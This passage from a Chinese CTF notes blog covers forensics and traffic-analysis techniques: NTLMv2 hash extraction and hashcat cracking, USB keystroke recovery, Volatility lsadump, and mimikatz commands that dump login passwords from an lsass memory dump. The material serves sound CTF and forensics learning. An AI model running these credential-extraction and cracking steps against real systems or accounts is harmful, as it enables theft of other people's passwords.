\?b表示尝试所有可打印字符，\?l是所有小写字母，\?u是所有大写字母，\?d是所有数字,\?s是所有特殊字符，\?a是字母加数字（等同?l?u?d），\?p是ascii字符（等同?l?u?d?s）</span><br></pre></td></tr></table></figure><p>不知道长度也可以爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -k 119be489 086fed79 8cbf1ed7 -b \?b</span><br></pre></td></tr></table></figure><h1 id="流量分析题"><a href="#流量分析题" class="headerlink" title="流量分析题"></a><u>流量分析题</u></h1><h2 id="思路：-5"><a href="#思路：-5" class="headerlink" title="思路："></a><u>思路：</u></h2><p>先导出一下http，tcp，ftp看一下有没有什么东西，没有再过滤，一个个查看tcp流</p><p>如果有东西可以保存下来。</p><p>有的是键盘流量和鼠标流量，注意辨别。</p><p>如果没思路的话可以试试foremost或者binwalk一下</p><p>更多流量分析可以看这个 <a href="https://metaviii.github.io/2025/02/Network-Traffic-Analysis/">Network Traffic Analysis | MetaVi</a></p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a><u>常用命令</u></h2><p>过滤post</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method==POST</span><br></pre></td></tr></table></figure><p>过滤get</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method==GET</span><br></pre></td></tr></table></figure><h2 id="SQL注入——布尔盲注"><a href="#SQL注入——布尔盲注" class="headerlink" title="SQL注入——布尔盲注"></a><u>SQL注入——布尔盲注</u></h2><p>它是用ascii码的大小比较来判断库名、表名、字段名和字段值的内容的</p><p>用二分法来爆破得出库里内容的</p><p>可以试着先过滤一下http流量，再&#x2F;文件&#x2F;导出分组解析结果&#x2F;AS CSV，把流量导出成表格。看得更清楚。</p><p>一般来说，前面的内容是hacker来判断数据库名、表名、字段名的，我们可以直接拉到最下面来看。</p><p>因为用的是二分法，所以在对一个字符进行bool判断时，被重复判断的ASCII值就是正确的字符。</p><p>我们需要找到被重复判断的flag的ascii转化。</p><h2 id="NTML流量分析（SMB流量）"><a href="#NTML流量分析（SMB流量）" class="headerlink" title="NTML流量分析（SMB流量）"></a><u>NTML流量分析（SMB流量）</u></h2><p>我们需要的是这些东西</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response</span><br></pre></td></tr></table></figure><p>有两种方式</p><p>1.tshark</p><p>tshark可以获得<code>username::domain:ServerChallenge:NTproofstring:</code>，但是没有<code>modifiedntlmv2response</code></p><p>命令（tshark是kali自带的）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -n -r eztraffic.pcapng -Y &#x27;ntlmssp.messagetype == 0x00000003&#x27; -T fields -e ntlmssp.auth.username -e ntlmssp.auth.domain -e ntlmssp.ntlmv2_response.ntproofstr -e ntlmssp.auth.sesskey -e smb2.sesid</span><br></pre></td></tr></table></figure><p>接下来还是要回到流量里找<code>modifiedntlmv2response</code>，这里顺便讲了第二种方法</p><p>2.流量里找</p><p>过滤这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntlmssp</span><br></pre></td></tr></table></figure><p>找到<code>NTLMSSP_AUTH</code> 包 打开流量包中的 <code>Security Blob</code>层 复制用户名、域名</p><p>然后过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntlmssp.ntlmserverchallenge</span><br></pre></td></tr></table></figure><p>查找<code>NTLM Server Challenge</code>字段，通常这个数据包是在<code>NTLM_Auth</code>数据包之前，将该值作为十六进制字符串复制到文本文档</p><p>最后需要的<code>modifiedntlmv2response</code>仍然在<code>NTLM_Auth</code>里</p><p>需要我们在里面找到<code>NTLMv2 Response</code></p><p>除了<code>NTProofStr</code>以外的就是我们要找的<code>modifiedntlmv2response</code>了（注意这里复制hex值）</p><p>&#x3D;&#x3D;&gt;得到的所有东西需要以</p><p>username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response</p><p>形式保存到txt文本里，然后使用hashcat爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.\hashcat -m 5600 hash.txt rockyou.txt</span><br><span class="line"># 5600 表示NetNTLMv2模式</span><br><span class="line"># rockyou是github上找的字典，还挺大</span><br></pre></td></tr></table></figure><p>就能拿到密码了。</p><h2 id="USB流量"><a href="#USB流量" class="headerlink" title="USB流量"></a><u>USB流量</u></h2><p>usb流量还是蛮好辨别的：键盘流量是8字节的，鼠标是4字节。</p><p>可以先用tshark提取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#这个格式为 usbhid </span><br><span class="line">tshark -r keyboard.pcapng -T fields -e usbhid.data &gt; usbdata.txt</span><br><span class="line">#keyboard.pcapng是被提取的流量</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#这个格式是 usb.capdata.</span><br><span class="line">#提取数据的命令，这里用正则表达式剔除了空行</span><br><span class="line">tshark -r usb.pcapng -T fields -e usb.capdata | sed &#x27;/^\s*$/d&#x27; &gt; usbdata.txt</span><br><span class="line"># -r 指定了需要读取的文件</span><br><span class="line"># -T 表示仅仅输出所选字段</span><br><span class="line"># -e 指定提取的字段</span><br><span class="line"># 在sed中使用正则表达式过滤掉所有空行（其中 ^\s*$ 匹配空行，`d` 表示删除）</span><br></pre></td></tr></table></figure><h3 id="键盘流量"><a href="#键盘流量" class="headerlink" title="键盘流量"></a>键盘流量</h3><p>键盘流量有标准——hid键盘标准： <a href="https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf">https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf</a></p><p>如果看的烦的话也可以去网上搜相关的标准</p><p>&#x2F;</p><p>或者我们可以去下一个 UsbKeyboardDataHacker——恢复击键信息</p><p>地址 <a href="https://github.com/WangYihang/UsbKeyboardDataHacker">GitHub - WangYihang&#x2F;UsbKeyboardDataHacker: USB键盘流量包取证工具 , 用于恢复用户的击键信息</a></p><p>为此我还安装了虚拟环境</p><p>先激活环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source UsbKeyboardDataHacker/bin/activate</span><br></pre></td></tr></table></figure><p>再切</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd UsbKeyboardDataHacker</span><br></pre></td></tr></table></figure><p>分析（注意要在同目录下）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 UsbKeyboardDataHacker.py --input key.pcap</span><br></pre></td></tr></table></figure><h2 id="TTL加密"><a href="#TTL加密" class="headerlink" title="TTL加密"></a><u>TTL加密</u></h2><p>看到的txt类似于这种：</p><img src="屏幕截图 2025-02-14 181234.png" alt="屏幕截图 2025-02-14 181234" style="zoom: 67%;"><p>实际上这是TTL加密</p><blockquote><p>[!NOTE]</p><p>TTL加密：<br>简单来说就是，图中63，127，191，255转化为二进制的值分别为 00111111，01111111，10111111，11111111。</p><p>发现只有前两位不同，TTL加密就是利用前两位进行加密，将每个前两位重新进行合并，8位为一组。</p><p>所以TTL加密的解密方法：</p><p>1，将所有前两位合并为8位，并且每八位一组。</p><p>2，将上面的每组转化为十六进制的字符</p></blockquote><p>解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"> </span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>, <span class="string">&quot;r&quot;</span>)  <span class="comment">#输入的txt</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">Binary = <span class="string">&#x27;&#x27;</span></span><br><span class="line">number = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    num = f.readline()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> num:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> num.rstrip() == <span class="string">&#x27;63&#x27;</span>:  <span class="comment"># 去掉每行后面的空格</span></span><br><span class="line">        Binary = <span class="string">&#x27;00&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> num.rstrip() == <span class="string">&#x27;127&#x27;</span>:</span><br><span class="line">        Binary = <span class="string">&#x27;01&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> num.rstrip() == <span class="string">&#x27;191&#x27;</span>:</span><br><span class="line">        Binary = <span class="string">&#x27;10&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> num.rstrip() == <span class="string">&#x27;255&#x27;</span>:</span><br><span class="line">        Binary = <span class="string">&#x27;11&#x27;</span></span><br><span class="line">    <span class="built_in">str</span> += Binary</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(<span class="built_in">str</span>), <span class="number">8</span>):</span><br><span class="line">    number += <span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">data = binascii.unhexlify(number)</span><br><span class="line"> </span><br><span class="line">f2=<span class="built_in">open</span>(<span class="string">&#x27;111.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)    <span class="comment">#保存到111.txt</span></span><br><span class="line">f2.write(data)</span><br><span class="line">f2.close()</span><br></pre></td></tr></table></figure><p>这个脚本要跑好一会，最后保存至111.txt。</p><h2 id="voip流量"><a href="#voip流量" class="headerlink" title="voip流量"></a><u>voip流量</u></h2><p>这种实际上就是电话的流量</p><p>可以在wireshark中点击<code>电话-voip通话</code>来查看</p><h1 id="内存取证-磁盘取证"><a href="#内存取证-磁盘取证" class="headerlink" title="内存取证&#x2F;磁盘取证"></a><u>内存取证&#x2F;磁盘取证</u></h1><h2 id="思路：-6"><a href="#思路：-6" class="headerlink" title="思路："></a><u>思路：</u></h2><p>这种需要虚拟机来挂载文件，可以使用vmware或者FTK，我做的不多。。</p><p>或者用vera挂载的。</p><h2 id="veracrypt"><a href="#veracrypt" class="headerlink" title="veracrypt"></a><u>veracrypt</u></h2><p>这个需要一个文件，可以挂载磁盘</p><p>而且可能会需要密钥和密钥文件，例子：</p><img src="2024-12-12 162453.png" alt="2024-12-12 162453" style="zoom: 33%;"><h2 id="vol2-vol3"><a href="#vol2-vol3" class="headerlink" title="vol2 || vol3"></a><u>vol2 || vol3</u></h2><p>可以使用vol2或3来分析</p><p>查看imageinfo——查看操作版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f image.raw imageinfo</span><br></pre></td></tr></table></figure><p>lsadump——看用户密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f image.raw --profile=Win7SP1x86_23418 lsadump  </span><br><span class="line">#profile后面跟的是imageinfo得到的操作版本</span><br><span class="line">#lsadump需要安装插件</span><br></pre></td></tr></table></figure><p>vol2的一些基本命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 识别操作系统的基本信息</span><br><span class="line">vol.py mem.dump imageinfo</span><br><span class="line"># 查看进程</span><br><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 pslist</span><br><span class="line"># 查看隐藏或者解链的进程</span><br><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 pstree</span><br><span class="line"># 通过memdump爆破出进程对应的信息，3036是对应进程</span><br><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 memdump -p 3036 --dump-dir=./  </span><br></pre></td></tr></table></figure><p>注意，mspaint.exe是画图进程，可能会藏东西，如果有的话可以dump下来，改后缀为.data，使用GIMP2打开图片。不断修改x，y的值直到看到藏的东西。（GIMP2可以在microsoft store里下到）</p><h2 id="vmdk文件"><a href="#vmdk文件" class="headerlink" title=".vmdk文件"></a><u>.vmdk文件</u></h2><p>后缀为 <strong><code>.vmdk</code></strong> 的文件是 VMware 虚拟磁盘文件，通常用于虚拟机环境中存储虚拟机的磁盘数据。</p><p><strong>vmdk可以用7z解压！</strong></p><p>可以使用虚拟机打开试试。</p><p>有些可以看010，有内容的话，可以尝试解密，有时候直接复制解密不了</p><p>可以使用kali自带的7z解密提取这些文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z x flag.vmdk -o./</span><br></pre></td></tr></table></figure><p>解压后就能看到好几个文件夹。</p><h2 id="vhd文件"><a href="#vhd文件" class="headerlink" title="vhd文件"></a><u>vhd文件</u></h2><p>这是磁盘文件，可以直接双击打开，会发现多了两个磁盘，在磁盘里可以找东西</p><p>怎么虚拟化来看图形化界面？</p><p>使用Hyper-V搭建虚拟机（怎么下Hyper-V？<a href="https://blog.csdn.net/wxzjn1027/article/details/140280294?ops_request_misc=%257B%2522request%255Fid%2522%253A%25226933d4915cc7ff339966cfabedb4e6fa%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=6933d4915cc7ff339966cfabedb4e6fa&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-140280294-null-null.142%5Ev100%5Epc_search_result_base8&utm_term=Hyper-V&spm=1018.2226.3001.4187">可以看这个</a></p><p>注意挂载vhd的时候要选择第一代来挂载，不然会报错</p><p>进入后可以win+r看上一条命令找线索。</p><p>理论上也可以更改vhd格式来使用vmware挂载。</p><p>如果vhd用了BitLocker加密的话我们可以使用<code>Elcomsoft Forensic Disk Decryptor</code>进行解密</p><h2 id="iso映像文件"><a href="#iso映像文件" class="headerlink" title="iso映像文件"></a><u>iso映像文件</u></h2><p>一般是u盘文件，可以直接改后缀为zip然后解压，或者formost提取出里面的内容</p><h2 id="安卓取证"><a href="#安卓取证" class="headerlink" title="安卓取证"></a><u>安卓取证</u></h2><p>安卓取证一般是给<code>vmdk</code>文件或者<code>ovf</code>文件，都可以用vmware挂载，后者可以直接在vm打开文件</p><h3 id="DiskGenius"><a href="#DiskGenius" class="headerlink" title="DiskGenius"></a>DiskGenius</h3><p>用于恢复磁盘删除的文件，也可以直接全部扫描然后提出来。</p><h1 id="pyjail-py沙盒逃逸"><a href="#pyjail-py沙盒逃逸" class="headerlink" title="pyjail &#x2F; py沙盒逃逸"></a><u>pyjail &#x2F; py沙盒逃逸</u></h1><h2 id="思路：-7"><a href="#思路：-7" class="headerlink" title="思路："></a><u>思路：</u></h2><p>要看他给没给源代码，没有怎么猜测，给了怎么绕过黑名单&#x2F;长度限制等等</p><p>参考链接： </p><p><a href="https://c3ngh.top/post/pyjail/">Python沙盒逃逸深度学习 | C3ngH’s B10g</a></p><p><a href="https://blog.csdn.net/Jayjay___/article/details/132436072">Python Jail 沙盒逃逸 合集_pyjail-CSDN博客</a></p><h1 id="ms-office题"><a href="#ms-office题" class="headerlink" title="ms-office题"></a><u>ms-office题</u></h1><h2 id="思路：-8"><a href="#思路：-8" class="headerlink" title="思路："></a><u>思路：</u></h2><p>可以改后缀为zip看看，文本里可能会把文字改成白色的来隐藏可以ctrla+改色看看</p><p>遇到的加密过的mc-office可以用passwarekit来爆破</p><h2 id="ms-office文件本质是zip"><a href="#ms-office文件本质是zip" class="headerlink" title="ms-office文件本质是zip"></a><u>ms-office文件本质是zip</u></h2><p>MS-Office文件word、excel、ppt本质都是zip文件，就可以隐写。</p><p>可以直接改后缀名为zip</p><h2 id="宏"><a href="#宏" class="headerlink" title="宏"></a><u>宏</u></h2><p>如果后缀是docm的话可能有宏，在宏里看看</p><p>1.WPS自带宏查看，在 视图&#x2F;宏&#x2F;查看宏 里</p><p>2.使用olevba</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">olevba decode.docm</span><br></pre></td></tr></table></figure><h2 id="doc里隐藏文字"><a href="#doc里隐藏文字" class="headerlink" title="doc里隐藏文字"></a><u>doc里隐藏文字</u></h2><p>勾选<code>文件/选项/显示/隐藏文字</code></p><p>然后看看有无隐藏的东西</p><h1 id="视频题"><a href="#视频题" class="headerlink" title="视频题"></a><u>视频题</u></h1><h2 id="思路：-9"><a href="#思路：-9" class="headerlink" title="思路："></a><u>思路：</u></h2><p>我遇到的一般是在视频的某一帧里藏二维码之类的内容，需要好点的眼力</p><h2 id="帧慢放"><a href="#帧慢放" class="headerlink" title="帧慢放"></a><u>帧慢放</u></h2><p>使用potplayer即可</p><h1 id="其他-工具"><a href="#其他-工具" class="headerlink" title="其他 &amp;&amp; 工具"></a><u>其他 &amp;&amp; 工具</u></h1><h2 id="反编译——这应该是reverse领域才对。。"><a href="#反编译——这应该是reverse领域才对。。" class="headerlink" title="反编译——这应该是reverse领域才对。。"></a><u>反编译——这应该是reverse领域才对。。</u></h2><h3 id="pyc反编译"><a href="#pyc反编译" class="headerlink" title="pyc反编译"></a>pyc反编译</h3><blockquote><p><code>.pyc</code> 是 Python 编译后的字节码文件，通常是在运行 Python 脚本时由解释器自动生成，用于加速程序运行</p><p>想查看 <code>.pyc</code> 文件的源码，可以使用反编译工具 uncompyle6 将其还原为 <code>.py</code> 文件。</p></blockquote><p>-使用 uncompyle6</p><p>-在线网站 <a href="https://tool.lu/pyc/">https://tool.lu/pyc/</a></p><h3 id="exe反编译"><a href="#exe反编译" class="headerlink" title="exe反编译"></a>exe反编译</h3><p>使用IDA</p><h3 id="apk反编译"><a href="#apk反编译" class="headerlink" title="apk反编译"></a>apk反编译</h3><p>使用jadx-gui-1.4.4-no-jre-win.exe</p><h2 id="eml文件"><a href="#eml文件" class="headerlink" title="eml文件"></a><u>eml文件</u></h2><p>拿到一个邮件文件后缀是eml的可以利用QQ邮箱，</p><p>选择写信，收信人写自己，把eml文件拖进去，然后发送。</p><p>之后自己就能收到这个文件，QQ邮箱可以预览eml文件，如果有附件的话直接下载就好了。</p><h2 id="dmp文件"><a href="#dmp文件" class="headerlink" title=".dmp文件"></a><u>.dmp文件</u></h2><blockquote><p>dmp文件是windows系统中的错误转储文件，当Windows发生错误蓝屏的时候，系统将当前内存【含虚拟内存】中的数据直接写到文件中去，方便定位故障原因。</p><p>里面包含主机用户密码信息</p></blockquote><p>.dmp文件binwalk和foremost提不出来，需要我们手动提一下</p><p>提出来之后用<code>mimikatz</code>分析文件，下载地址 <a href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919">发行版 2.2.0 20220919 Djoin parser &amp; Citrix SSO Extractor · gentilkiwi&#x2F;mimikatz · GitHub</a></p><p>这个是已经打包好的exe，直接运行就行</p><p>相关命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//提升权限</span><br><span class="line">privilege::debug</span><br><span class="line">//载入dmp文件</span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">//读取登陆密码</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure><h2 id="画图"><a href="#画图" class="headerlink" title="画图"></a><u>画图</u></h2><h3 id="1-gnuplot"><a href="#1-gnuplot" class="headerlink" title="1.gnuplot"></a>1.gnuplot</h3><p>得到诸如（7，7）的文本我们需要转化成 7 7 ，如</p><img src="2024-11-20 212245.png" alt="2024-11-20 212245" style="zoom:25%;"><p>转化成 ↓ ↓ ↓</p><img src="2024-11-20 213106.png" alt="2024-11-20 213106" style="zoom:25%;"><p>可以直接使用记事本的替换功能，比脚本好用的多</p><p><del>脚本</del>（<strong>不推荐</strong>）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;E:\meihuai.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> res:  <span class="comment"># 坐标格式文件比如(7,7)</span></span><br><span class="line">    re = res.read()</span><br><span class="line">    res.close()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;E:\output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> gnup:   <span class="comment"># 将转换后的坐标写入output.txt</span></span><br><span class="line">    re = re.split()</span><br><span class="line">    tem = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(re)):</span><br><span class="line">        tem = re[i]</span><br><span class="line">        tem = tem.lstrip(<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">        tem = tem.rstrip(<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(tem)):</span><br><span class="line">            <span class="keyword">if</span> tem[j] == <span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">                tem = tem[:j] + <span class="string">&#x27; &#x27;</span> + tem[j+<span class="number">1</span>:]</span><br><span class="line">        gnup.write(tem + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    gnup.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gnuplot</span><br></pre></td></tr></table></figure><p>再</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plot &#x27;zuobiao.txt&#x27;  </span><br></pre></td></tr></table></figure><p>来进行画图，画好后会自己打开</p><h3 id="2-RGB数据串转图片"><a href="#2-RGB数据串转图片" class="headerlink" title="2.RGB数据串转图片"></a>2.RGB数据串转图片</h3><p>可以用随波逐流</p><p>不行就脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL  <span class="keyword">import</span> Image</span><br><span class="line">string=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">file=<span class="built_in">open</span>(<span class="string">&#x27;qr.txt&#x27;</span>)</span><br><span class="line">MAX=<span class="number">200</span></span><br><span class="line"></span><br><span class="line">picture=Image.new(<span class="string">&quot;RGB&quot;</span>,(MAX,MAX))</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(MAX):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(MAX):</span><br><span class="line">        string =file.readline()</span><br><span class="line">        picture.putpixel([x,y],<span class="built_in">eval</span>(string)) <span class="comment">#直接使用eval()可以转为元组</span></span><br><span class="line">picture.show()</span><br></pre></td></tr></table></figure><h3 id="3-Logo画图"><a href="#3-Logo画图" class="headerlink" title="3.Logo画图"></a>3.Logo画图</h3><p>这种的代码很有特征，类似于这种：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cs pu lt 90 fd 500 rt 90 pd fd 100 rt 90 repeat 18[fd 5 rt 10] lt 135 fd 50 lt 135 pu bk 100 pd setcolor pick [ red orange yellow green blue violet ] repeat 18[fd 5 rt 10] rt 90 fd 60 rt 90 bk 30 rt 90 fd 60 pu lt 90 fd 100 pd rt 90 fd 50 bk 50 setcolor pick [ red orange yellow green blue violet ] lt 90 fd 50 rt 90 fd 50 pu fd 50 pd fd 25 bk 50 fd 25 rt 90 fd 50 pu setcolor pick [ red orange yellow green blue violet ] fd 100 rt 90 fd 30 rt 45 pd fd 50 bk 50 rt 90 fd 50 bk 100 fd 50 rt 45 pu fd 50 lt 90 pd fd 50 bk 50 rt 90 setcolor pick [ red orange yellow green blue violet ] fd 50 pu lt 90 fd 100 pd fd 50 rt 90 fd 25 bk 25 lt 90 bk 25 rt 90 fd 25 setcolor pick [ red orange yellow green blue violet ] pu fd 25 lt 90 bk 30 pd rt 90 fd 25 pu fd 25 lt 90 pd fd 50 bk 25 rt 90 fd 25 lt 90 fd 25 bk 50 pu bk 100 lt 90 setcolor pick [ red orange yellow green blue violet ] fd 100 pd rt 90 arc 360 20 pu rt 90 fd 50 pd arc 360 15 pu fd 15 setcolor pick [ red orange yellow green blue violet ] lt 90 pd bk 50 lt 90 fd 25 pu home bk 100 lt 90 fd 100 pd arc 360 20 pu home</span><br></pre></td></tr></table></figure><p>那就是画图没跑了</p><p>在线网站： <a href="https://www.calormen.com/jslogo/">Logo解释器</a></p><h3 id="4-base64转图片"><a href="#4-base64转图片" class="headerlink" title="4.base64转图片"></a>4.base64转图片</h3><p>随波逐流</p><h2 id="路由器配置查看工具"><a href="#路由器配置查看工具" class="headerlink" title="路由器配置查看工具"></a><u>路由器配置查看工具</u></h2><h3 id="RouterPassView"><a href="#RouterPassView" class="headerlink" title="RouterPassView"></a>RouterPassView</h3><p>-下载 <a href="https://routerpassview.en.lo4d.com/windows">https://routerpassview.en.lo4d.com/windows</a></p><p>使用方法：</p><p>用于恢复路由器密码的工具，能够从路由器中提取用户，密码，无线密钥等信息</p><p>RouterPassView,大多数现代路由器允许您备份到一个文件路由器的配置，然后从文件中恢复配置时的需要。路由器的备份文件通常包含了像您的ISP的用户名重要数据&#x2F;密码，路由器的登录密码，无线网络的关键。如果你失去了这些密码1 &#x2F;钥匙，但你仍然有你的路由器配置的备份文件，RouterPassView可以帮助你从你的路由器恢复您丢失密码的文件。</p><h2 id="010editor-zip模板对照表"><a href="#010editor-zip模板对照表" class="headerlink" title="010editor .zip模板对照表"></a><u>010editor .zip模板对照表</u></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">+ ZIPFILERECORD record # 压缩源文件数据区</span><br><span class="line">    - char frSignature[4] # 压缩源文件标志</span><br><span class="line">    - ushort frVersion # 压缩源文件版本</span><br><span class="line">    - ushort frFlags # 压缩源文件标志 （有无加密，这个更改这里进行伪加密，改为01 00打开就会提示有密码了）</span><br><span class="line">    - enum COMPTYPE frCompression</span><br><span class="line">    - DOSTIME frFileTime # 压缩源文件时间</span><br><span class="line">    - DOSDATE frFileDate # 压缩源文件日期</span><br><span class="line">    - uint frCrc # 压缩源文件CRC32校验值</span><br><span class="line">    - uint frCompressedSize 